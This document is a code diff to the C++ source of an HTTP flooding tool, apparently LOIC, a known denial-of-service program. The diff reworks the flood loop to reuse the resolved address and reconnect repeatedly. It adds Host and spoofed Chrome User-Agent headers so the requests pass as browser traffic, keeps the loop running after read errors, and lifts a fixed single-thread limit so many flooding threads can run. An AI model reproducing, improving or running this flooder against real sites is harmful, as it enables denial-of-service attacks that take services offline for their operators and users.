@@ -12,13 +12,14 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <openssl/bio.h>
 namespace loic {
 
 void HTTPFlooder::work()
 {
 	hostname = false;
 	struct addrinfo hints;
-	struct addrinfo *result, *rp;
+	struct addrinfo *result;
 	int sfd, s;
 	size_t len;
 	ssize_t nread;
@@ -32,55 +33,75 @@ void HTTPFlooder::work()
 	try
 	{
 		int i = 0;
+
+
+		//gets the address
+	 	std::cout<<"getting address\n";
+		s = getaddrinfo(ip.c_str(),port.c_str(), &hints, &result);
+		if (s != 0) {
+			fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
+			return;
+		}
+
+		//gets the address info which persists in the rest of the connections
+		struct addrinfo *rp;
+
+		for (rp = result; rp != NULL; rp = rp->ai_next) {
+			sfd = socket(rp->ai_family, rp->ai_socktype,rp->ai_protocol);
+
+			if (sfd == -1)
+				continue;
+
+			if (connect(sfd, rp->ai_addr, rp->ai_addrlen) != -1)
+			{
+				if(!resp)
+				{
+					int val = fcntl(sfd, F_GETFL, 0);
+					fcntl(sfd, F_SETFL, val | O_NONBLOCK);
+				}
+				this->state = requestingState;
+				std::cout<<rp->ai_addr<<" "<<rp->ai_addrlen<<std::endl;
+				std::cout<<"successfully connect\n";
+				close(sfd);
+				break;                  // Success
+			}
+
+			close(sfd);
+		}
+
+		if (rp == NULL) {               // No address succeeded
+			fprintf(stderr, "Could not connect\n");
+			return;
+		}
 		while(this->isFlooding())
 		{
 			this->state = readyState;
 
+			sfd = socket(rp->ai_family, rp->ai_socktype,rp->ai_protocol);
+
+			if (sfd == -1)
+				return;
+			if (connect(sfd, rp->ai_addr, rp->ai_addrlen) != -1)
+			{
+				if(!resp)
+				{
+					int val = fcntl(sfd, F_GETFL, 0);
+					fcntl(sfd, F_SETFL, val | O_NONBLOCK);
+				}
+				this->state = requestingState;
+				std::cout<<rp->ai_addr<<" "<<rp->ai_addrlen<<std::endl;
+				std::cout<<"successfully connect\n";
+			}
+
 			//tick
 			lastAction = time(NULL)/3600;
-
-			fprintf(stdout,"getting address\n");
-			s = getaddrinfo(ip.c_str(),port.c_str(), &hints, &result);
-			if (s != 0) {
-				fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
-				continue;
-			}
-
-
-			for (rp = result; rp != NULL; rp = rp->ai_next) {
-				sfd = socket(rp->ai_family, rp->ai_socktype,rp->ai_protocol);
-
-				if (sfd == -1)
-					continue;
-
-				if (connect(sfd, rp->ai_addr, rp->ai_addrlen) != -1)
-				{
-					if(!resp)
-					{
-						int val = fcntl(sfd, F_GETFL, 0);
-						fcntl(sfd, F_SETFL, val | O_NONBLOCK);
-					}
-					this->state = requestingState;
-					std::cout<<"successfully connect\n";
-					break;                  /* Success */
-				}
-
-				close(sfd);
-			}
-
-			if (rp == NULL) {               /* No address succeeded */
-				fprintf(stderr, "Could not connect\n");
-				continue;
-			}
-
-			freeaddrinfo(result);
 
 			this->state = connectingState;
 
 			std::cout<<"sending"<<std::endl;
 
 			std::stringstream stream("");
-			stream<<"GET /"<<this->subsite<<" HTTP/1.1\r\n\r\n";
+			stream<<"GET /"<<this->subsite<<" HTTP/1.1\r\nHost: "<<ip<<"\r\nUser-agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.97 Safari/537.11\r\nConnection: keep-alive\r\n\r\n";
 			char buf[stream.str().length()];
 			strcpy(buf,stream.str().c_str());
 
@@ -102,7 +123,7 @@ void HTTPFlooder::work()
 				nread = read(sfd, buffer, BUF_SIZE);
 				if (nread == -1) {
 					perror("read");
-					exit(EXIT_FAILURE);
+					std::cerr<<EXIT_FAILURE<<std::endl;
 				}
 				else
 				{
@@ -119,6 +140,7 @@ void HTTPFlooder::work()
 				boost::this_thread::sleep(boost::posix_time::milliseconds(delay));
 			}
 			std::cout<<"finished "<<i++<<std::endl;
+			close(sfd);
 
 		}
 	}
@@ -129,6 +151,7 @@ void HTTPFlooder::work()
 	}
 	flooding = false;
 
+	freeaddrinfo(result);
 }
 
 	void HTTPFlooder::checkTimeOut()
@@ -155,7 +178,6 @@ void HTTPFlooder::work()
 		//can use bind as well
 		boost::thread t(&loic::HTTPFlooder::checkTimeOut,this);
 
-		unsigned int numThreads = 1;
 		for(unsigned int i = 0; i<numThreads;i++)
 		{
 			boost::thread thread(&loic::HTTPFlooder::work,this);
